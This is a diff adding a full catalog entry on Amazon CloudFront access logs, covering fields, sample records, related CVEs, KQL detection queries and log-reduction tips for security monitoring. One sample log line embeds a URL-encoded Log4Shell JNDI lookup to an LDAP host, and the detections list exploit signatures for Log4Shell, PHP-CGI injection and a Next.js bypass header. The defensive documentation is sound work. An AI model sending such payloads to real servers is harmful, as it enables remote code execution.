@@ -2,10 +2,384 @@
 id: aws-cloudfront
 name: Amazon CloudFront
 short: CloudFront
+aka:
+  - AWS CDN
+  - CloudFront standard logs
+  - CloudFront real-time logs
+  - Lambda@Edge
+  - CloudFront Functions
 vendor: Amazon Web Services
 category: netinfra
-status: stub
-summary: AWS CDN; standard (W3C tab-separated) and real-time access logs per edge request.
+status: full
+updated: "2026-11-12"
+contributors:
+  - wlinde
+tags:
+  - aws
+  - cdn
+  - http
+  - edge
+  - access-log
+  - tsv
+  - kinesis
+  - waf
+summary: AWS's content delivery network — 600+ edge locations that terminate TLS, cache and forward HTTP(S) requests to S3, ALB, API Gateway or custom origins, with AWS WAF, Shield, signed URLs and edge functions in the request path. Standard logs (W3C tab-separated, or JSON/Parquet with logging v2) and real-time logs (Kinesis) record every edge request, usually the first and most complete view of internet traffic to an application.
 sourcetypes:
   - st: aws_cloudfront_accesslog
+    desc: Pack Generator sourcetype for CloudFront standard (W3C, tab-separated) access logs
   - st: aws_cloudfront_accesslogs
+    desc: Pack Generator sourcetype for CloudFront access logs (also used for real-time log records)
+  - st: aws:cloudfront:accesslogs
+    desc: Splunk Add-on for AWS sourcetype for CloudFront standard access logs from S3
+facts:
+  First released: November 2008
+  Delivery model: Managed global service (distributions are global; logs are configured per distribution)
+  Edge footprint: 600+ points of presence plus regional edge caches
+  Origins: S3, ALB / EC2, API Gateway, MediaStore, Lambda function URLs, any custom HTTP origin
+  Log transport: "Standard logs: S3 files (legacy) or logging v2 to S3, CloudWatch Logs or Data Firehose; real-time logs: Kinesis Data Streams"
+  Log format: "W3C tab-separated (33 fields, #Version/#Fields headers); logging v2 also JSON, plain and Parquet (S3); real-time = tab-separated selected fields"
+  Latency: Standard logs best effort, typically within an hour; real-time logs within seconds
+  Typical volume: One record per edge request (~500–800 B); high-traffic sites produce 100M+ per day
+  Cribl Pack: No dedicated Dispensary pack found — Cribl's access-log sampling recipe covers aws:cloudfront:accesslogs
+placement:
+  slots:
+    - edge
+    - cloud
+    - remote
+  items:
+    - slot: edge
+      title: Internet edge for web apps and APIs
+      desc: The public hostname resolves to CloudFront; AWS WAF and Shield inspect at the edge, and only CloudFront talks to the origin (origin access control, custom header or prefix list).
+    - slot: cloud
+      title: Origins in AWS
+      desc: S3 buckets for static content, ALBs or API Gateway for dynamic content. Origin logs show CloudFront IPs; the real client is in CloudFront logs and X-Forwarded-For.
+    - slot: remote
+      title: End users and bots
+      desc: Browsers, mobile apps, scrapers and scanners worldwide; c-ip, user agent and (real-time) c-country describe them.
+howItWorks:
+  - title: Edge request processing
+    body: The viewer connects to the nearest edge; CloudFront terminates TLS (SNI picks the distribution's certificate), runs viewer-request CloudFront Functions or Lambda@Edge, then looks up the object in the edge and regional caches.
+  - title: Cache behaviours
+    body: Path patterns map to cache behaviours with their own origin, cache policy (TTL and cache key), origin request policy (headers, cookies, query strings forwarded) and allowed methods. x-edge-result-type records Hit, RefreshHit, Miss, LimitExceeded, CapacityExceeded, Error or Redirect.
+  - title: Security controls
+    body: AWS WAF web ACLs (managed rules, rate-based rules, bot control), Shield Standard/Advanced DDoS protection, geo restriction, signed URLs/cookies for private content and origin access control for S3. A WAF or geo block appears as sc-status 403 with x-edge-result-type Error.
+  - title: Standard logs
+    body: Each edge writes log files per distribution. Legacy logging writes W3C files to S3; logging v2 (CloudWatch vended logs) delivers the same fields to S3, CloudWatch Logs or Firehose, in W3C, JSON, plain or Parquet, with field selection. Logs are best effort and not guaranteed complete.
+  - title: Real-time logs
+    body: A real-time log configuration selects fields (including c-country, cs-headers, cs-header-names, primary-distribution-id) and a sampling rate, and sends tab-separated records to a Kinesis data stream within seconds — the input for low-latency detection or a Cribl Kinesis source.
+traffic:
+  handles:
+    - HTTP/1.1, HTTP/2 and HTTP/3 viewers
+    - TLS termination with SNI
+    - Static and dynamic content to S3 / ALB / API Gateway / custom origins
+    - WebSockets and gRPC
+    - Signed URLs and cookies
+    - Edge compute (CloudFront Functions, Lambda@Edge)
+    - AWS WAF and Shield inspection
+  flow:
+    - step: DNS + connect
+      desc: The viewer resolves the distribution hostname and connects to the nearest edge location.
+    - step: TLS + viewer request
+      desc: TLS terminates at the edge; viewer-request functions can rewrite or reject the request.
+    - step: WAF / geo
+      desc: AWS WAF rules and geo restriction allow, count, challenge or block (403).
+    - step: Cache lookup
+      desc: The cache key is computed; Hit is served from the edge, Miss goes to the regional cache or origin.
+    - step: Origin fetch
+      desc: CloudFront requests the object from the origin with configured headers, then caches it per TTL.
+    - step: Response + log
+      desc: The response is returned; a standard log record (and an optional real-time record) is written.
+logs:
+  - type: Standard access log (W3C)
+    sourcetype: aws_cloudfront_accesslog
+    format: tsv
+    share: 95–100 %
+    avg: ~650 B
+    desc: One tab-separated line per edge request with the 33 standard fields. User agent, referer and query are URL-encoded. Files start with #Version and #Fields header lines.
+    fields:
+      - date
+      - time
+      - x_edge_location
+      - sc_bytes
+      - c_ip
+      - cs_method
+      - cs_host
+      - cs_uri_stem
+      - sc_status
+      - cs_referer
+      - cs_user_agent
+      - cs_uri_query
+      - cs_cookie
+      - x_edge_result_type
+      - x_edge_request_id
+      - x_host_header
+      - cs_protocol
+      - cs_bytes
+      - time_taken
+      - x_forwarded_for
+      - ssl_protocol
+      - ssl_cipher
+      - x_edge_response_result_type
+      - cs_protocol_version
+      - fle_status
+      - fle_encrypted_fields
+      - c_port
+      - time_to_first_byte
+      - x_edge_detailed_result_type
+      - sc_content_type
+      - sc_content_len
+      - sc_range_start
+      - sc_range_end
+    key:
+      - c_ip
+      - cs_method
+      - x_host_header
+      - cs_uri_stem
+      - sc_status
+      - cs_user_agent
+      - x_edge_result_type
+      - sc_bytes
+    noise:
+      - cs_host
+      - x_edge_request_id
+      - fle_status
+      - fle_encrypted_fields
+      - sc_range_start
+      - sc_range_end
+      - x_edge_response_result_type
+      - cs_cookie
+    sample: "2026-11-12\t09:14:22\tFRA56-P5\t4511\t203.0.113.45\tGET\td111111abcdef8.cloudfront.net\t/assets/app.js\t200\thttps://www.example.com/\tMozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36\t-\t-\tHit\tEXAMPLEreqid0123456789abcdefEXAMPLEreqid0123==\twww.example.com\thttps\t312\t0.002\t-\tTLSv1.3\tTLS_AES_128_GCM_SHA256\tHit\tHTTP/2.0\t-\t-\t51544\t0.002\tHit\tapplication/javascript\t4210\t-\t-"
+  - type: Blocked / error request
+    sourcetype: aws:cloudfront:accesslogs
+    format: tsv
+    share: 0.1–5 %
+    avg: ~600 B
+    desc: Requests answered with an error at the edge — WAF and geo blocks (403, x-edge-result-type Error), signed-URL failures, origin errors (502/504) and capacity limits. Exploit payloads appear URL-encoded in the user agent and query.
+    fields:
+      - date
+      - time
+      - x_edge_location
+      - sc_bytes
+      - c_ip
+      - cs_method
+      - cs_host
+      - cs_uri_stem
+      - sc_status
+      - cs_referer
+      - cs_user_agent
+      - cs_uri_query
+      - cs_cookie
+      - x_edge_result_type
+      - x_edge_request_id
+      - x_host_header
+      - cs_protocol
+      - cs_bytes
+      - time_taken
+      - x_forwarded_for
+      - ssl_protocol
+      - ssl_cipher
+      - x_edge_response_result_type
+      - cs_protocol_version
+      - fle_status
+      - fle_encrypted_fields
+      - c_port
+      - time_to_first_byte
+      - x_edge_detailed_result_type
+      - sc_content_type
+      - sc_content_len
+      - sc_range_start
+      - sc_range_end
+    key:
+      - c_ip
+      - cs_uri_stem
+      - cs_uri_query
+      - sc_status
+      - cs_user_agent
+      - x_edge_result_type
+      - x_edge_detailed_result_type
+    noise:
+      - cs_host
+      - x_edge_request_id
+      - fle_status
+      - fle_encrypted_fields
+      - sc_range_start
+      - sc_range_end
+    sample: "2026-11-12\t02:41:09\tIAD55-P3\t919\t198.51.100.77\tGET\td111111abcdef8.cloudfront.net\t/login\t403\t-\t%24%7Bjndi:ldap://198.51.100.77:1389/a%7D\tuser=%24%7Bjndi:ldap://198.51.100.77:1389/b%7D\t-\tError\tEXAMPLEreqidWAF0123456789abcdefEXAMPLEreqid====\twww.example.com\thttps\t221\t0.001\t-\tTLSv1.3\tTLS_AES_128_GCM_SHA256\tError\tHTTP/1.1\t-\t-\t40122\t0.001\tError\ttext/html\t919\t-\t-"
+  - type: Real-time log record
+    sourcetype: aws_cloudfront_accesslogs
+    format: tsv
+    share: configurable (1–100 % sampling)
+    avg: ~300–700 B
+    desc: Tab-separated record in Kinesis with the fields chosen in the real-time log configuration, in that order. This example selects timestamp, client, country, request, status, bytes, timing, user agent, edge, result type and the list of request header names.
+    fields:
+      - timestamp
+      - c_ip
+      - c_country
+      - cs_method
+      - cs_host
+      - cs_uri_stem
+      - cs_uri_query
+      - sc_status
+      - sc_bytes
+      - time_taken
+      - cs_user_agent
+      - x_edge_location
+      - x_edge_result_type
+      - cs_header_names
+    key:
+      - c_ip
+      - c_country
+      - cs_uri_stem
+      - sc_status
+      - cs_user_agent
+      - cs_header_names
+    noise:
+      - cs_uri_query
+      - x_edge_location
+    sample: "1762938862.512\t192.0.2.150\tNL\tGET\twww.example.com\t/admin/dashboard\t-\t200\t18342\t0.214\tMozilla/5.0%20(X11;%20Linux%20x86_64)%20curl-impersonate\tAMS58-P2\tMiss\tHost%0AUser-Agent%0AAccept%0Ax-middleware-subrequest"
+cves:
+  - id: CVE-2025-29927
+    cvss: 9.1
+    year: 2025
+    kev: false
+    scope: traffic
+    title: Next.js middleware authorization bypass via the x-middleware-subrequest header — Next.js apps are often served through CloudFront
+    affected: Next.js 11.1.4 up to (not including) 12.3.5, 13.5.9, 14.2.25 and 15.2.3 when auth is enforced in middleware
+    fixed: 12.3.5, 13.5.9, 14.2.25, 15.2.3
+    detect: Real-time logs with cs_header_names (or cs-headers) containing x-middleware-subrequest, followed by 200 responses on protected paths (/admin, /dashboard) without a prior login flow from that c_ip.
+    avoid: Patch; strip x-middleware-subrequest at the edge (CloudFront Function or origin request policy that does not forward it); WAF rule blocking the header.
+  - id: CVE-2023-44487
+    cvss: 7.5
+    year: 2023
+    kev: true
+    scope: traffic
+    title: HTTP/2 "Rapid Reset" DoS — record-size attacks hit CloudFront in 2023; AWS mitigated it at the edge
+    affected: HTTP/2 implementations; CloudFront was protected by AWS-side mitigations (bulletin AWS-2023-011)
+    fixed: AWS-side mitigations for CloudFront and ALB; origins reachable directly must still be patched
+    detect: Spikes of HTTP/2.0 requests per c_ip with very small sc_bytes and Error / CapacityExceeded result types; origin-side, any traffic that bypasses CloudFront.
+    avoid: Keep origins reachable only through CloudFront (origin access control, prefix list, secret header); WAF rate-based rules; Shield Advanced for critical apps.
+  - id: CVE-2024-4577
+    cvss: 9.8
+    year: 2024
+    kev: true
+    scope: traffic
+    title: PHP-CGI argument injection on Windows — exploit requests pass through the CDN and are logged at the edge
+    affected: PHP 8.1 before 8.1.29, 8.2 before 8.2.20, 8.3 before 8.3.8 with PHP-CGI on Windows
+    fixed: 8.1.29, 8.2.20, 8.3.8
+    detect: cs_uri_query starting with %AD or %25AD (soft hyphen) followed by d+allow_url_include or auto_prepend_file, sc_status 200 from a Miss (reached origin).
+    avoid: Patch PHP; WAF PHP application managed rule group; cache behaviour that rejects unexpected query strings on .php paths.
+  - id: CVE-2021-44228
+    cvss: 10
+    year: 2021
+    kev: true
+    scope: traffic
+    title: Log4Shell — JNDI lookups in user agent, query and headers of requests through CloudFront to Java origins
+    affected: Apache Log4j 2.0-beta9 – 2.15.0 (excluding 2.12.2, 2.12.3, 2.3.1)
+    fixed: Log4j 2.17.1 (Java 8), 2.12.4 (Java 7), 2.3.2 (Java 6)
+    detect: "cs_user_agent, cs_uri_query or cs_referer containing %24%7Bjndi (URL-encoded ${jndi:) or nested ${${ variants."
+    avoid: Patch origins; AWS WAF AWSManagedRulesKnownBadInputsRuleSet (Log4JRCE); never log raw user agents with a vulnerable Log4j.
+detections:
+  - title: Exploit payloads reaching the origin
+    severity: high
+    signals:
+      - cs_user_agent / cs_uri_query contains %24%7B, %AD, ../
+      - x_edge_result_type=Miss and sc_status 2xx
+    why: A Miss with 2xx means the payload was not blocked at the edge and was answered by the origin — check that origin for compromise.
+    kql: |-
+      dataset="aws_cloudfront" 
+      | where cs_user_agent has_any ("%24%7Bjndi","${jndi") or cs_uri_query has_any ("%24%7B","%ADd","%25ADd","..%2F")
+      | summarize hits=count(), reached=countif(x_edge_result_type=="Miss" and sc_status startswith "2") by c_ip, x_host_header, cs_uri_stem
+    mitre:
+      - T1190
+  - title: Cache-busting origin flood
+    severity: high
+    signals:
+      - sudden rise in Miss ratio
+      - many unique cs_uri_query per path
+      - few c_ip or one user agent
+    why: Random query strings force every request to the origin, turning the CDN into an amplifier against it — a common application-layer DDoS pattern.
+    kql: |-
+      dataset="aws_cloudfront"
+      | summarize total=count(), miss=countif(x_edge_result_type=="Miss"), queries=dcount(cs_uri_query) by x_host_header, cs_uri_stem, bin(_time, 5m)
+      | where total > 10000 and miss * 1.0 / total > 0.8 and queries > 5000
+    mitre:
+      - T1499.002
+  - title: WAF blocks per client
+    severity: medium
+    signals:
+      - sc_status=403
+      - x_edge_result_type=Error
+      - high count per c_ip
+    why: Concentrated blocks show active scanners or attackers; tune rules if a known partner IP is blocked.
+    kql: |-
+      dataset="aws_cloudfront" sc_status="403" x_edge_result_type="Error"
+      | summarize blocks=count(), paths=dcount(cs_uri_stem) by c_ip, cs_user_agent, bin(_time, 15m)
+      | where blocks > 100
+    mitre:
+      - T1595.002
+  - title: Next.js middleware bypass header
+    severity: critical
+    signals:
+      - cs_header_names contains x-middleware-subrequest
+      - sc_status=200 on protected path
+    why: Legitimate browsers never send this internal header; its presence on a request that succeeds on /admin is exploitation of CVE-2025-29927.
+    kql: |-
+      dataset="aws_cloudfront" cs_header_names has "x-middleware-subrequest"
+      | summarize count() by c_ip, c_country, cs_uri_stem, sc_status
+    mitre:
+      - T1190
+  - title: Admin paths accessed from unexpected countries
+    severity: medium
+    signals:
+      - cs_uri_stem starts with /admin or /wp-admin
+      - c_country not in allow-list
+    why: Back-office paths are used by a small, known population; access from new countries points to stolen sessions or credential stuffing.
+    kql: |-
+      dataset="aws_cloudfront" cs_uri_stem startswith "/admin"
+      | where c_country !in ("NL","DE","GB")
+      | summarize requests=count(), ok=countif(sc_status=="200") by c_ip, c_country, cs_user_agent
+    mitre:
+      - T1078
+optimizations:
+  - title: Sample cache hits for static assets
+    saving: 40–80 %
+    fn: Sampling
+    how: Hits for images, scripts and styles are the bulk of CDN logs and are rarely investigated individually. Sample 20:1; keep every Miss on dynamic paths, every Error and every 4xx/5xx.
+    expr: x_edge_result_type=='Hit' && /\.(js|css|png|jpe?g|gif|svg|woff2?|ico|webp)$/.test(cs_uri_stem)
+  - title: Aggregate to traffic metrics
+    saving: 60–90 %
+    fn: Aggregations
+    how: Roll requests, bytes, hit ratio and p95 time_taken per host, path prefix, status class and edge location per minute for dashboards; send raw to Lake.
+    expr: sc_status.startsWith('2') || sc_status.startsWith('3')
+  - title: Drop header lines and unused fields
+    saving: 20–35 %
+    fn: Parser → Serialize
+    how: Drop the #Version/#Fields lines, then remove x_edge_request_id, fle_*, sc_range_*, cs_host (the cloudfront.net name) and dash values before serialising.
+    expr: "drop: /^#/.test(_raw); remove: x_edge_request_id, fle_status, fle_encrypted_fields, sc_range_start, sc_range_end, cs_host; drop value=='-'"
+  - title: Route errors and blocks to the SIEM
+    saving: SIEM licence
+    fn: Routes
+    how: 403 / Error / 5xx and anything matching exploit patterns to the SIEM in full; successful traffic to Lake (or only metrics to the SIEM).
+    expr: x_edge_result_type=='Error' || /^[45]/.test(sc_status) → SIEM | else → Lake
+references:
+  - title: CloudFront standard log file fields
+    url: https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/standard-logs-reference.html
+  - title: CloudFront standard logging (v2) — output formats and destinations
+    url: https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/standard-logging.html
+  - title: CloudFront real-time logs
+    url: https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/real-time-logs.html
+  - title: AWS security bulletin AWS-2023-011 (CVE-2023-44487)
+    url: https://aws.amazon.com/security/security-bulletins/AWS-2023-011/
+  - title: Next.js advisory GHSA-f82v-jwr5-mffw (CVE-2025-29927)
+    url: https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
+  - title: PHP advisory GHSA-3qgc-jrrr-25jv (CVE-2024-4577)
+    url: https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv
+  - title: Cribl recipe for sampling access logs (Apache, ELB, CDN, S3)
+    url: https://docs.cribl.io/stream/usecase-access-logs/
+related:
+  - aws-waf
+  - aws-elb
+  - aws-s3-access
+  - cloudflare-waf
+  - imperva-waf
+  - nginx
